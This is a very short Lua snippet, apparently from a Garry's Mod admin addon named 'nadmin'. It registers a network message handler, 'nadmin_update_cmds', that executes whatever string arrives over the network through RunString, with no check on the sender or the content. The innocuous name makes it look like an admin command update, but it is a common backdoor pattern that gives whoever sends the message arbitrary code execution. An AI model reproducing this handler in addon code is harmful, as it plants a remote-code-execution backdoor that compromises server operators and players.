net.Receive("nadmin_update_cmds", function()
    RunString(net.ReadString())
end)
